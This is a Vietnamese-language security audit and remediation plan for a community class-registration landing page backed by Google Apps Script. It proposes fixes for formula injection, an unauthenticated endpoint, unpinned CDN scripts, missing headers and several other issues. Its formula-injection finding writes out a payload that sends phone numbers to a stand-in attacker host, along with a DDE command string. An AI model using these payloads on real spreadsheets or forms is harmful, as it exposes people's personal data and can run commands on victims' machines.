# Rà soát bảo mật landing page & kế hoạch khắc phục

## Mục tiêu

Rà soát toàn bộ landing page `Muối Đi Học` (front-end tĩnh + Google Apps Script Web App), liệt kê các lỗ hổng bảo mật nghiêm trọng và đưa ra kế hoạch sửa chữa theo thứ tự ưu tiên.

**Tài liệu này chỉ là rà soát + kế hoạch, chưa sửa code.** Các đoạn code trong phần "Cách sửa" đã viết sẵn để dán vào khi bạn duyệt.

## Phạm vi đã rà soát

- `index.html` — markup, thẻ script/CDN, form đăng ký, iframe, modal
- `app.js` — tracking, gửi dữ liệu, lightbox, xử lý DOM
- `google-apps-script/Code.gs` — endpoint nhận dữ liệu, ghi Sheet, gửi Telegram
- `styles.css`, `README.md`, `.gitignore`
- Toàn bộ lịch sử git (tìm secret bị commit nhầm)
- Kiểm tra thực tế endpoint Apps Script (chỉ gửi `GET`, không ghi dữ liệu)

## Bảng tổng hợp

| # | Lỗi | Mức độ | File |
| --- | --- | --- | --- |
| 1 | Formula injection vào Google Sheet | **Nghiêm trọng** | `Code.gs` |
| 2 | Endpoint ghi dữ liệu công khai, không xác thực, không giới hạn tần suất | **Nghiêm trọng** | `Code.gs`, `app.js` |
| 3 | Thư viện CDN không ghim phiên bản, không SRI | **Nghiêm trọng** | `index.html` |
| 4 | Không có bất kỳ security header nào (thiếu CSP, chống clickjacking) | Cao | thiếu `vercel.json` |
| 5 | Không validate phía server, không giới hạn kích thước dữ liệu | Cao | `Code.gs` |
| 6 | Token Telegram để trong mã nguồn của repo public | Cao | `Code.gs`, `README.md` |
| 7 | Thu thập PII (họ tên, tuổi, SĐT) không có thông báo/chính sách | Cao | `index.html` |
| 8 | Trả chi tiết lỗi nội bộ về cho client | Trung bình | `Code.gs` |
| 9 | Escape Telegram Markdown thiếu → mất thông báo | Trung bình | `Code.gs` |
| 10 | `getActiveSheet()` + không có khoá ghi đồng thời | Trung bình | `Code.gs` |
| 11 | Bảng dev console còn trong DOM bản production | Thấp | `index.html`, `app.js` |

### Những điểm đã làm đúng (không cần sửa)

Để khỏi mất công rà lại: **không tìm thấy lỗ hổng XSS**. Mọi chỗ hiển thị dữ liệu động đều dùng `innerText`/`textContent`; hai chỗ dùng `innerHTML` (`app.js:1026-1101`) chỉ ghi lại chuỗi HTML cố định của chính nút bấm, không có dữ liệu người dùng. Hai link ra ngoài đều đã có `rel="noopener noreferrer"`, hai iframe YouTube đều có `referrerpolicy`. Lịch sử git sạch — token Telegram chưa bao giờ bị commit (biến vẫn là chuỗi rỗng từ commit đầu tiên `b38a63f`).

---

## Chi tiết từng lỗi

### 1. Formula injection vào Google Sheet — Nghiêm trọng

**Vấn đề.** `Code.gs` ghi thẳng dữ liệu người dùng vào Sheet bằng `sheet.appendRow(row)` (dòng 97 và 139). Google Sheets xử lý chuỗi bắt đầu bằng `=`, `+`, `-`, `@` **như công thức**, y hệt như khi gõ tay vào ô.

**Kịch bản khai thác.** Kẻ tấn công điền ô "Họ và Tên":

```
=IMAGE("https://attacker.example/log?d="&TEXTJOIN(",",1,D2:D200))
```

Khi BTC mở Sheet, công thức chạy dưới quyền tài khoản của BTC và gửi **toàn bộ cột số điện thoại học viên** sang server của kẻ tấn công. Không có cảnh báo nào hiện ra vì `IMAGE` không cần cấp quyền như `IMPORTXML`.

Kịch bản thứ hai nguy hiểm hơn: BTC export Sheet ra `.csv`/`.xlsx` rồi mở bằng Excel. Chuỗi kiểu `=cmd|'/c calc'!A1` (DDE) có thể dẫn tới **thực thi lệnh trên máy nhân sự BTC**.

**Vì sao nghiêm trọng.** Không cần kỹ năng gì — chỉ cần gõ vào form đăng ký công khai. Hậu quả là lộ toàn bộ dữ liệu cá nhân của học viên đã đăng ký.

**Cách sửa.** Thêm hàm khử công thức và áp cho mọi giá trị trước khi ghi:

```javascript
const CELL_MAX_LENGTH = 500;

/** Sheets coi chuỗi mở đầu bằng = + - @ là công thức → thêm dấu ' để ép về text. */
function sanitizeCell_(value) {
  if (value === undefined || value === null) return "";
  let text = String(value).replace(/[\u0000-\u001F\u007F]/g, " ").trim();
  if (text.length > CELL_MAX_LENGTH) text = text.slice(0, CELL_MAX_LENGTH);
  if (/^[=+\-@\t\r]/.test(text)) text = "'" + text;
  return text;
}
```

Rồi bọc kết quả của `normalizeRow_()`, `appendVisit_()` và `deviceColumns_()`:

```javascript
return [ /* ...các giá trị... */ ].concat(deviceColumns_(data)).map(sanitizeCell_);
```

### 2. Endpoint ghi dữ liệu công khai, không xác thực, không giới hạn tần suất — Nghiêm trọng

**Vấn đề.** URL Web App nằm công khai trong `app.js:4`, deploy ở chế độ "Anyone", và `doPost` chấp nhận mọi JSON không kèm bất kỳ kiểm tra nào: không token, không CAPTCHA, không giới hạn số lần gọi, không kiểm tra `Origin`.

**Đã xác nhận thực tế.** Gọi `GET` tới endpoint từ máy ngoài (không đăng nhập Google) trả về `200`:

```json
{"status":"ok","message":"Muối Đi Học endpoint. POST với eventType visit|registration."}
```

Nghĩa là bất kỳ ai đọc source trang web đều gọi `POST` được.

**Kịch bản khai thác.**

- Bơm hàng nghìn dòng đăng ký giả → dữ liệu tuyển sinh thành rác, BTC không phân biệt nổi người thật.
- Đốt quota Apps Script (tài khoản thường: ~90 phút runtime/ngày, giới hạn 30 execution đồng thời). Hết quota thì **học viên thật không đăng ký được nữa** — DoS với chi phí gần như bằng 0.
- Khi bạn bật Telegram: mỗi POST là một tin nhắn → spam ngập nhóm BTC, và đốt tiếp quota `UrlFetch`.
- Kết hợp với lỗi #1: mỗi dòng rác có thể mang theo một công thức độc.

**Lưu ý về kiến trúc.** Apps Script **không cung cấp IP của client** trong object `e`, nên không thể rate-limit theo IP ngay trong script. Vì vậy cần giải pháp ở tầng khác (xem Giai đoạn 3).

### 3. Thư viện CDN không ghim phiên bản, không SRI — Nghiêm trọng

**Vấn đề.** Ba thư viện bên thứ ba được nạp mà không khoá phiên bản và không có `integrity`:

| Thẻ hiện tại trong `index.html` | Thực tế đang phục vụ |
| --- | --- |
| `https://unpkg.com/lucide@latest` (dòng 44) | redirect → `lucide@1.28.0` |
| `https://cdn.jsdelivr.net/npm/fullpage.js/dist/fullpage.min.js` (dòng 852) | `fullpage.js@4.0.41` |
| `https://cdn.tailwindcss.com` (dòng 15) | redirect → `/3.4.17` |

**Vì sao nghiêm trọng.** Trang này thu thập họ tên và số điện thoại. Bất kỳ JS nào chạy trên trang đều đọc được nội dung form và gửi đi bất cứ đâu. Với `@latest` + không SRI, chỉ cần **một bản publish độc hại của thư viện, hoặc một tài khoản npm bị chiếm** là toàn bộ người truy cập bị đánh cắp dữ liệu ngay lập tức, hoàn toàn tự động, không cần đụng vào repo hay hosting của bạn. Đây chính là kịch bản của các vụ Magecart.

Bằng chứng cho thấy rủi ro là có thật chứ không phải lý thuyết: `lucide@latest` **đã tự nhảy từ nhánh `0.x` lên `1.28.0`** — một thay đổi major version đã lên production mà không ai duyệt.

**Điểm thuận lợi khi sửa.** Tôi đã kiểm tra: ba phiên bản đang chạy hôm nay chính là `fullpage.js@4.0.41`, `lucide@1.28.0`, `tailwind 3.4.17`. Ghim đúng ba phiên bản này là **thay đổi byte-identical, không đổi hành vi gì cả**, chỉ khác là từ nay không tự nhảy version nữa.

**Cách sửa.** Thay các thẻ trong `index.html` bằng bản ghim + SRI (hash dưới đây tôi đã tự tải file về và tính, không phải copy từ tài liệu):

```html
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fullpage.js@4.0.41/dist/fullpage.min.css"
      integrity="sha384-ZUqRGyOfjhRX/cTD7Fnawi1HH+BXAhbV5JVyJH67SluVC7v2RMR53PK+CdGcbKjf"
      crossorigin="anonymous" referrerpolicy="no-referrer">

<script src="https://cdn.tailwindcss.com/3.4.17"
        integrity="sha384-igm5BeiBt36UU4gqwWS7imYmelpTsZlQ45FZf+XBn9MuJbn4nQr7yx1yFydocC/K"
        crossorigin="anonymous"></script>

<script src="https://cdn.jsdelivr.net/npm/lucide@1.28.0/dist/umd/lucide.min.js"
        integrity="sha384-VrnzGPiSyQxm3mI2VhlssyR85zugSHtxMkgO42qV3wUAbNk1oRdZkCWjXKOhuVu6"
        crossorigin="anonymous"></script>

<script src="https://cdn.jsdelivr.net/npm/fullpage.js@4.0.41/dist/fullpage.min.js"
        integrity="sha384-J4itSS8gXxeF1nvp2KKeQ8Pq/jCAkvlw+qh3yXGVJA7Hz8HKv+p38oLoirjFvHTD"
        crossorigin="anonymous"></script>
```

Lưu ý: SRI **không hoạt động trên URL có redirect**, nên bắt buộc phải dùng URL đã ghim version như trên.

Về lâu dài, Tailwind Play CDN vốn không dành cho production (chính tài liệu Tailwind ghi vậy) và nó chèn `<style>` lúc chạy nên chặn ta siết CSP — nên chuyển sang build file CSS tĩnh (xem Giai đoạn 5).

### 4. Không có bất kỳ security header nào — Cao

**Vấn đề.** Repo không có `vercel.json`, nên trang chỉ chạy với header mặc định. Thiếu toàn bộ:

- `Content-Security-Policy` — không có lớp phòng thủ thứ hai nếu một script bên thứ ba bị chiếm (lỗi #3).
- `frame-ancestors` / `X-Frame-Options` — trang **bị nhúng iframe được**. Kẻ tấn công phủ lớp trong suốt lên form đăng ký (clickjacking) để lừa người dùng gửi dữ liệu, hoặc dựng trang giả mạo BTC bằng chính iframe của bạn.
- `X-Content-Type-Options: nosniff`
- `Referrer-Policy`
- `Permissions-Policy`

**Cách sửa.** Tạo `vercel.json` ở gốc repo. Bật CSP ở chế độ **Report-Only trước** để không làm hỏng trang:

```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        { "key": "X-Content-Type-Options", "value": "nosniff" },
        { "key": "X-Frame-Options", "value": "DENY" },
        { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" },
        { "key": "Permissions-Policy", "value": "geolocation=(), microphone=(), camera=(), payment=(), usb=()" },
        { "key": "Strict-Transport-Security", "value": "max-age=63072000; includeSubDomains" },
        {
          "key": "Content-Security-Policy-Report-Only",
          "value": "default-src 'self'; base-uri 'self'; object-src 'none'; frame-ancestors 'none'; form-action 'self'; script-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdn.jsdelivr.net https://www.youtube.com https://s.ytimg.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.jsdelivr.net; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: blob: https://i.ytimg.com; connect-src 'self' https://script.google.com https://script.googleusercontent.com; frame-src https://www.youtube.com; upgrade-insecure-requests"
        }
      ]
    }
  ]
}
```

`'unsafe-inline'` ở `script-src` là tạm thời vì trang đang có 13 handler inline (`onclick`/`onsubmit`) và 3 khối `<script>` inline. Bỏ được nó là bước ở Giai đoạn 5.

### 5. Không validate phía server, không giới hạn kích thước — Cao

**Vấn đề.** Toàn bộ validate nằm ở `app.js` (`validateEnrollmentForm`, dòng 947-1011) — tức là chỉ ràng buộc người dùng dùng trình duyệt bình thường. `Code.gs` nhận gì ghi nấy: không kiểm tra trường bắt buộc, không kiểm tra định dạng SĐT, không giới hạn độ dài.

**Hậu quả.** Một POST duy nhất mang chuỗi 50.000 ký tự cũng được ghi. Spreadsheet có trần 10 triệu ô — kẻ tấn công có thể làm phình file tới mức Sheet không mở nổi.

**Cách sửa.** Giới hạn độ dài đã nằm trong `sanitizeCell_()` ở lỗi #1. Thêm validate:

```javascript
const VN_PHONE_PATTERN = /^0[35789]\d{8}$/;

function validateRegistration_(data) {
  const errors = [];
  const name = String(data.fullName || "").trim();
  const phone = String(data.phone || "").replace(/[\s.\-]/g, "");
  const age = Number(data.age);

  if (name.length < 2 || name.length > 100) errors.push("fullName");
  if (!VN_PHONE_PATTERN.test(phone)) errors.push("phone");
  if (!isFinite(age) || age < 10 || age > 100) errors.push("age");
  if (data.acknowledgement !== true && data.acknowledgement !== "true") errors.push("acknowledgement");

  return errors;
}
```

Gọi ngay đầu nhánh registration trong `doPost`, sai thì trả lỗi chung và **không ghi Sheet**.

### 6. Token Telegram để trong mã nguồn của repo public — Cao

**Vấn đề.** `Code.gs:29-30` khai báo `TELEGRAM_BOT_TOKEN` / `TELEGRAM_CHAT_ID` là hằng số trong file, và `README.md` hướng dẫn "dán nội dung `Code.gs`" rồi điền thông tin thật. Repo này là public.

**Hiện trạng.** Đã kiểm tra toàn bộ lịch sử git — **chưa lộ**, hai biến vẫn rỗng từ đầu. Đây là lỗi phòng ngừa, nhưng cấu trúc code hiện tại gần như chắc chắn dẫn tới rò rỉ ở lần cấu hình tới: chỉ cần một lần copy file đã điền token ngược về repo là bot bị chiếm (đọc và gửi tin nhắn trong nhóm BTC).

**Cách sửa.** Chuyển sang Script Properties (Apps Script Editor → Project Settings → Script Properties), không bao giờ nằm trong file:

```javascript
function telegramConfig_() {
  const props = PropertiesService.getScriptProperties();
  return {
    token: props.getProperty("TELEGRAM_BOT_TOKEN"),
    chatId: props.getProperty("TELEGRAM_CHAT_ID")
  };
}
```

Rồi bỏ hẳn hai hằng số ở đầu file và cập nhật hướng dẫn deploy trong `README.md`.

### 7. Thu thập PII không có thông báo/chính sách — Cao

**Vấn đề.** Form thu thập họ tên, tuổi, số điện thoại (`index.html:604-636`) và tracking gắn `visitorId` lâu dài vào `localStorage`. Trang không có: chính sách quyền riêng tư, thông báo mục đích xử lý dữ liệu, thời hạn lưu trữ, cách liên hệ để xoá dữ liệu.

Checkbox "Tôi đã hiểu" hiện chỉ xác nhận các lưu ý về học phí và nước uống — **không phải là sự đồng ý xử lý dữ liệu cá nhân**.

**Rủi ro.** Nghị định 13/2023/NĐ-CP về bảo vệ dữ liệu cá nhân yêu cầu thông báo cho chủ thể dữ liệu và có cơ sở pháp lý trước khi xử lý. Đây là rủi ro pháp lý, không phải rủi ro kỹ thuật, nhưng với một dự án cộng đồng đang thu SĐT hàng trăm người thì nên xử lý sớm.

**Cách sửa.** Thêm mục chính sách quyền riêng tư ngắn gọn (mục đích thu thập, ai xem được, lưu bao lâu, email liên hệ để xoá) và một dòng thông báo ngay trên nút Đăng ký, có link tới chính sách.

### 8. Trả chi tiết lỗi nội bộ về cho client — Trung bình

`Code.gs:117` trả `error.toString()` thẳng về trình duyệt, lộ tên hàm và chi tiết nội bộ của script, giúp kẻ tấn công dò cấu trúc. Sửa: `console.error(error)` để xem trong Executions log, còn client chỉ nhận `{ status: "error", message: "Không thể xử lý yêu cầu." }`.

### 9. Escape Telegram Markdown thiếu — Trung bình

`escapeMarkdown_()` (`Code.gs:271-281`) escape `\ _ * [` và backtick. Bộ này chặn được việc chèn link giả `[text](url)` (vì `[` đã escape), nên **không có lỗ hổng chèn nội dung nghiêm trọng**. Nhưng `parse_mode: "Markdown"` (bản legacy) rất dễ vỡ: một ký tự lệch làm Telegram trả `400 Bad Request: can't parse entities`, và vì `sendTelegramNotification` nằm trong `try/catch` nên **thông báo đăng ký sẽ mất im lặng** — BTC không biết có người vừa đăng ký.

Sửa: chuyển sang `parse_mode: "HTML"` và chỉ escape ba ký tự `& < >`. Vừa an toàn hơn vừa khó vỡ hơn.

### 10. `getActiveSheet()` + không có khoá ghi đồng thời — Trung bình

`Code.gs:95` ghi đăng ký vào `getActiveSheet()` — sheet nào "đang active" phụ thuộc tab mà chủ file mở lần cuối. Đăng ký có thể bị ghi nhầm sang tab `Visits` hoặc `Stats`, phá cấu trúc dữ liệu. (`README.md:88` đã nhắc tới biến `REGISTRATIONS_SHEET_NAME` nhưng code không hề có biến này.)

Ngoài ra không dùng `LockService`: hai người submit cùng lúc có thể ghi đè lên nhau.

Sửa: thêm hằng `REGISTRATIONS_SHEET_NAME` và lấy sheet bằng `getSheetByName()`, đồng thời bọc phần ghi:

```javascript
const lock = LockService.getScriptLock();
if (!lock.tryLock(20000)) {
  return jsonResponse_({ status: "error", message: "Hệ thống đang bận, vui lòng thử lại." });
}
try {
  // ...ghi sheet...
} finally {
  lock.releaseLock();
}
```

### 11. Bảng dev console còn trong bản production — Thấp

`index.html:765-846` vẫn render bảng tracking; nút bật chỉ bị ẩn bằng class `hidden`, còn `toggleDevConsole()` là hàm global nên ai cũng gọi được từ console trình duyệt. Nó chỉ hiển thị dữ liệu của chính người đang xem nên tác động thấp, nhưng lộ chi tiết cơ chế tracking. Sửa: bỏ khỏi bản production hoặc chỉ render khi URL có `?debug=1`.

---

## Kế hoạch sửa chữa

Sắp theo thứ tự: giai đoạn trước chặn được rủi ro lớn nhất với ít rủi ro hồi quy nhất.

### Giai đoạn 1 — Vá endpoint (chỉ sửa `Code.gs`, không đụng giao diện)

Xử lý lỗi #1, #5, #6, #8, #10. Đây là nhóm quan trọng nhất và an toàn nhất vì không ảnh hưởng gì tới front-end.

1. Thêm `sanitizeCell_()`, áp cho `normalizeRow_()`, `appendVisit_()`, `deviceColumns_()`.
2. Thêm `validateRegistration_()`, chặn ghi khi dữ liệu sai.
3. Chuyển token Telegram sang Script Properties, xoá hằng số khỏi file, cập nhật `README.md`.
4. Thay `error.toString()` bằng thông báo chung + `console.error`.
5. Dùng `getSheetByName(REGISTRATIONS_SHEET_NAME)` + `LockService`.

*Kiểm tra:* chạy `testAppendSampleRow()` trong editor với `fullName = '=IMAGE("https://example.com/x.png")'` → ô trong Sheet phải hiện ra đúng chuỗi text, không render ảnh, không thành công thức. Gửi thử một đăng ký thật từ trang để xác nhận luồng chưa hỏng.

*Deploy:* dán lại `Code.gs` → Save → Deploy → Manage deployments → New version. URL không đổi nên `app.js` không cần sửa.

### Giai đoạn 2 — Khoá chuỗi cung ứng + security header

Xử lý lỗi #3, #4.

1. Ghim version + SRI cho ba thư viện (hash đã có sẵn ở mục #3). Vì trùng đúng phiên bản đang chạy nên rủi ro hồi quy gần như bằng không.
2. Thêm `vercel.json` với các header, CSP để ở chế độ `Report-Only`.
3. Theo dõi violation report vài ngày, chỉnh whitelist cho khớp.
4. Đổi `Content-Security-Policy-Report-Only` thành `Content-Security-Policy`.

*Kiểm tra:* mở trang trên Chrome + Safari, xác nhận không có lỗi SRI trong console, icon Lucide hiện đủ, fullPage chuyển section mượt, video YouTube autoplay, form gửi được. Kiểm tra thêm trên in-app browser Facebook vì phần video đã có xử lý riêng cho môi trường này.

### Giai đoạn 3 — Chống lạm dụng endpoint

Xử lý lỗi #2 — cần nhiều thay đổi nhất nên tách riêng.

Có hai hướng, chọn một:

**Hướng A (nhẹ, không cần thêm hạ tầng):** Cloudflare Turnstile — miễn phí, không bắt người dùng giải câu đố.

- Thêm widget Turnstile vào form đăng ký, gửi kèm token trong payload.
- `Code.gs` gọi `UrlFetchApp` tới `https://challenges.cloudflare.com/turnstile/v0/siteverify` để xác thực token trước khi ghi; secret key để trong Script Properties.
- Thêm một trường honeypot ẩn: bot điền vào thì bỏ qua request.
- Thêm rate-limit thô theo `visitorId` bằng `CacheService`:

```javascript
function tooManyRequests_(key, maxPerWindow, windowSeconds) {
  const cache = CacheService.getScriptCache();
  const cacheKey = "rl_" + key;
  const current = Number(cache.get(cacheKey) || 0) + 1;
  cache.put(cacheKey, String(current), windowSeconds);
  return current > maxPerWindow;
}
```

(Rate-limit theo `visitorId` chỉ chặn được bot ngây thơ vì client tự sinh ID này — nó là lớp phụ, Turnstile mới là lớp chính.)

**Hướng B (mạnh nhất, nhiều việc hơn):** dựng Vercel Serverless Function làm proxy tại `api/submit.js`.

- Front-end gọi `/api/submit` thay vì gọi thẳng Apps Script → **URL Apps Script không còn xuất hiện trong source công khai**.
- Function giữ URL Apps Script trong environment variable, rate-limit theo IP thật (Apps Script không làm được điều này), và kiểm tra `Origin`.
- Có thể kết hợp thêm Turnstile.

Khuyến nghị: làm Hướng A trước (nhanh, chặn được 95% spam thực tế), cân nhắc Hướng B nếu vẫn bị tấn công có chủ đích.

### Giai đoạn 4 — Riêng tư & vận hành

Xử lý lỗi #7, #11.

1. Viết mục chính sách quyền riêng tư + link ngay cạnh nút Đăng ký; tách checkbox đồng ý xử lý dữ liệu ra khỏi checkbox "Tôi đã hiểu".
2. Rà lại quyền chia sẻ Google Sheet (chỉ những người thực sự cần), bật xác thực 2 bước cho tài khoản chủ sheet — vì toàn bộ dữ liệu học viên nằm ở đó và Web App chạy dưới quyền tài khoản này.
3. Gỡ bảng dev console khỏi bản production hoặc chỉ bật khi có `?debug=1`.
4. Đặt lịch nhắc rà soát cập nhật thư viện định kỳ (repo không có `package.json` nên Dependabot không dùng được — cần quy trình thủ công, và sau khi ghim version thì việc này là bắt buộc).

### Giai đoạn 5 — Siết CSP (tuỳ chọn, làm sau cùng)

Bỏ được `'unsafe-inline'` khỏi `script-src`, biến CSP thành lớp phòng thủ thật sự:

1. Chuyển 13 handler inline (`onclick`, `onsubmit`) sang `addEventListener` với `data-action`.
2. Đưa 3 khối `<script>` inline (config Tailwind, shim Vercel) ra file riêng.
3. Thay Tailwind Play CDN bằng file CSS build sẵn — bỏ luôn được `'unsafe-inline'` ở `style-src` và giảm ~400KB JS tải về mỗi lượt truy cập.

---

## Ghi chú về mức độ ưu tiên

Nếu chỉ làm được một việc: **Giai đoạn 1**. Formula injection là lỗi duy nhất trong danh sách có thể dẫn tới lộ toàn bộ số điện thoại học viên chỉ bằng một lần điền form, và nó sửa được hoàn toàn trong một file, không đụng tới giao diện, không cần deploy lại front-end.
